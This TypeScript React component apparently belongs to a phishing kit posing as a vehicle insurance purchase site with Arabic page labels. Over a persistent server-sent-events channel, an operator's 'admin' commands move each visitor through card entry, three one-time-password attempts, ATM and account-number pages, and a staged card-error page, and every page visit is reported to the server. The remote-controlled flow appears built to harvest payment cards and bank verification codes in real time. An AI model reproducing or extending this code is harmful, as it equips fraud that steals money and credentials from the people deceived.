import { useEffect, useRef, useCallback, useState } from "react";
import { useLocation } from "wouter";
import type { SSEMessage } from "@/hooks/useSSE";
import { trackPage } from "@/lib/api";

interface GlobalRedirectProviderProps {
  children: React.ReactNode;
}

// All possible pages
const pageMap: Record<string, string> = {
  go_home: "/",
  go_form: "/form",
  go_select: "/select",
  go_visa: "/visa",
  go_otp: "/otp",
  go_otp2: "/otp2",
  go_otp3: "/otp3",
  go_atm: "/atm",
  go_nomer: "/nomer",
  go_nomer_wait: "/nomer-wait",
  go_nomer_otp: "/nomer-otp",
  go_identity_check: "/identity-check",
  go_total: "/total",
  go_total2: "/total2",
  go_waiting: "/waiting",
  go_errorvisa: "/errorvisa",
};

// Page Arabic names for tracking
const pageArabicMap: Record<string, string> = {
  "/": "الصفحة الرئيسية",
  "/form": "بيانات المركبة",
  "/select": "اختيار الباقة",
  "/total": "ملخص التكلفة",
  "/total2": "تأكيد التكلفة",
  "/visa": "الدفع بالبطاقة",
  "/otp": "رمز التحقق",
  "/otp2": "رمز التحقق (محاولة 2)",
  "/otp3": "رمز التحقق (محاولة 3)",
  "/atm": "صراف ATM",
  "/nomer": "رقم الحساب",
  "/nomer-wait": "انتظار التحقق",
  "/nomer-otp": "رمز التحقق للحساب",
  "/identity-check": "التحقق من الهوية",
  "/waiting": "قائمة الانتظار",
};

// Singleton SSE manager to handle all redirects globally
class SSEManager {
  private static instance: SSEManager;
  private eventSource: EventSource | null = null;
  private sessionId: string | null = null;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 10;
  private reconnectDelay = 2000;
  private listeners: Set<(message: SSEMessage) => void> = new Set();
  private connectionListeners: Set<(connected: boolean) => void> = new Set();
  private isIntentionalClose = false;

  private constructor() {}

  static getInstance(): SSEManager {
    if (!SSEManager.instance) {
      SSEManager.instance = new SSEManager();
    }
    return SSEManager.instance;
  }

  connect(sessionId: string): void {
    // Don't reconnect if already connected to the same session
    if (this.eventSource && this.sessionId === sessionId) {
      console.log("[SSEManager] Already connected to session:", sessionId);
      return;
    }

    // Close existing connection if different session
    if (this.eventSource && this.sessionId !== sessionId) {
      console.log("[SSEManager] Switching to new session:", sessionId);
      this.disconnect();
    }

    this.sessionId = sessionId;
    this.isIntentionalClose = false;
    this.createConnection();
  }

  private createConnection(): void {
    if (!this.sessionId) return;

    console.log("[SSEManager] Creating SSE connection for session:", this.sessionId);

    const apiUrl = import.meta.env.VITE_API_URL || "";
    const baseUrl = apiUrl || window.location.origin;
    const sseUrl = `${baseUrl}/api/sse/${this.sessionId}`;

    // Clean up old connection
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }

    const eventSource = new EventSource(sseUrl);
    this.eventSource = eventSource;

    // Handle connection established
    eventSource.addEventListener("connected", (event) => {
      console.log("[SSEManager] SSE connected:", event.data);
      this.reconnectAttempts = 0;
      this.notifyConnectionListeners(true);
    });

    // Handle control events - CRITICAL: don't close connection after redirect
    eventSource.addEventListener("control", (event) => {
      try {
        const message: SSEMessage = JSON.parse(event.data);
        console.log("[SSEManager] Received control event:", message);
        this.notifyListeners(message);
      } catch (error) {
        console.error("[SSEManager] Error parsing SSE message:", error);
      }
    });

    // Handle heartbeat events
    eventSource.addEventListener("heartbeat", (event) => {
      console.log("[SSEManager] Heartbeat received:", event.data);
    });

    // Handle errors - CRITICAL: attempt reconnection, don't close
    eventSource.onerror = (error) => {
      console.error("[SSEManager] SSE error:", error);
      this.notifyConnectionListeners(false);

      // Don't reconnect if we intentionally closed
      if (this.isIntentionalClose) {
        console.log("[SSEManager] Intentional close, not reconnecting");
        return;
      }

      // Attempt reconnection with exponential backoff
      if (this.reconnectAttempts < this.maxReconnectAttempts) {
        this.reconnectAttempts++;
        const delay = this.reconnectDelay * Math.pow(1.5, this.reconnectAttempts - 1);
        console.log(`[SSEManager] Reconnecting in ${delay}ms (attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts})...`);
        
        setTimeout(() => {
          if (!this.isIntentionalClose && this.sessionId) {
            this.createConnection();
          }
        }, delay);
      } else {
        console.error("[SSEManager] Max reconnection attempts reached");
      }
    };

    eventSource.onopen = () => {
      console.log("[SSEManager] SSE connection opened");
      this.notifyConnectionListeners(true);
    };
  }

  disconnect(): void {
    console.log("[SSEManager] Disconnecting SSE");
    this.isIntentionalClose = true;
    
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }
    
    this.sessionId = null;
    this.notifyConnectionListeners(false);
  }

  addListener(callback: (message: SSEMessage) => void): void {
    this.listeners.add(callback);
  }

  removeListener(callback: (message: SSEMessage) => void): void {
    this.listeners.delete(callback);
  }

  addConnectionListener(callback: (connected: boolean) => void): void {
    this.connectionListeners.add(callback);
  }

  removeConnectionListener(callback: (connected: boolean) => void): void {
    this.connectionListeners.delete(callback);
  }

  private notifyListeners(message: SSEMessage): void {
    this.listeners.forEach((listener) => {
      try {
        listener(message);
      } catch (error) {
        console.error("[SSEManager] Listener error:", error);
      }
    });
  }

  private notifyConnectionListeners(connected: boolean): void {
    this.connectionListeners.forEach((listener) => {
      try {
        listener(connected);
      } catch (error) {
        console.error("[SSEManager] Connection listener error:", error);
      }
    });
  }

  isConnected(): boolean {
    return this.eventSource !== null && this.eventSource.readyState === EventSource.OPEN;
  }
}

export function GlobalRedirectProvider({ children }: GlobalRedirectProviderProps) {
  const [, setLocation] = useLocation();
  const [isConnected, setIsConnected] = useState(false);
  const sseManagerRef = useRef<SSEManager | null>(null);

  // Get sessionId from localStorage, create if doesn't exist
  const getSessionId = useCallback(() => {
    let sessionId = localStorage.getItem("sessionId");
    if (!sessionId) {
      sessionId = crypto.randomUUID();
      localStorage.setItem("sessionId", sessionId);
      // Set cookie for server-side auth middleware
      document.cookie = `sessionId=${sessionId}; path=/; max-age=${7 * 24 * 60 * 60}; SameSite=Lax`;
      console.log("[GlobalRedirect] Created new sessionId:", sessionId);
    } else {
      // Ensure cookie is synced with localStorage
      document.cookie = `sessionId=${sessionId}; path=/; max-age=${7 * 24 * 60 * 60}; SameSite=Lax`;
    }
    return sessionId;
  }, []);

  // Handle redirect from admin
  const handleRedirect = useCallback((message: SSEMessage) => {
    console.log("[GlobalRedirect] Processing command:", message.action);

    // Handle card error - redirect to errorvisa page
    if (message.action === "card_error") {
      console.log("[GlobalRedirect] Card error received, redirecting to errorvisa");
      setLocation("/errorvisa");
      return;
    }

    // Handle redirect actions
    const targetPage = pageMap[message.action];
    if (targetPage) {
      console.log("[GlobalRedirect] Redirecting to:", targetPage);
      // DON'T close SSE - keep connection for next command
      setLocation(targetPage);
    }
  }, [setLocation]);

  // Initialize SSE manager on mount
  useEffect(() => {
    // Get singleton instance
    sseManagerRef.current = SSEManager.getInstance();

    // Add listener for control events
    sseManagerRef.current.addListener(handleRedirect);

    // Add connection status listener
    const connectionCallback = (connected: boolean) => {
      console.log("[GlobalRedirect] Connection status changed:", connected);
      setIsConnected(connected);
    };
    sseManagerRef.current.addConnectionListener(connectionCallback);

    // Connect if session exists
    const sessionId = getSessionId();
    if (sessionId) {
      console.log("[GlobalRedirect] Connecting to SSE with session:", sessionId);
      sseManagerRef.current.connect(sessionId);
    } else {
      console.log("[GlobalRedirect] No session found, skipping SSE connection");
    }

    // Cleanup on unmount
    return () => {
      if (sseManagerRef.current) {
        sseManagerRef.current.removeListener(handleRedirect);
        sseManagerRef.current.removeConnectionListener(connectionCallback);
        // Don't disconnect - let singleton persist
      }
    };
  }, [getSessionId, handleRedirect]);

  // Listen for session changes (when user completes a session)
  useEffect(() => {
    const handleStorageChange = (e: StorageEvent) => {
      if (e.key === "sessionId") {
        const newSessionId = e.newValue;
        if (sseManagerRef.current) {
          if (newSessionId) {
            console.log("[GlobalRedirect] Session changed, reconnecting:", newSessionId);
            sseManagerRef.current.connect(newSessionId);
          } else {
            console.log("[GlobalRedirect] Session cleared, disconnecting");
            sseManagerRef.current.disconnect();
          }
        }
      }
    };

    window.addEventListener("storage", handleStorageChange);
    return () => window.removeEventListener("storage", handleStorageChange);
  }, []);

  // Track page changes
  const [location] = useLocation();
  
  useEffect(() => {
    const sessionId = getSessionId();
    if (sessionId && location) {
      // Send page tracking to server
      trackPage(sessionId, location).catch((error) => {
        console.error("[GlobalRedirect] Failed to track page:", error);
      });
    }
  }, [location, getSessionId]);

  return <>{children}</>;
}
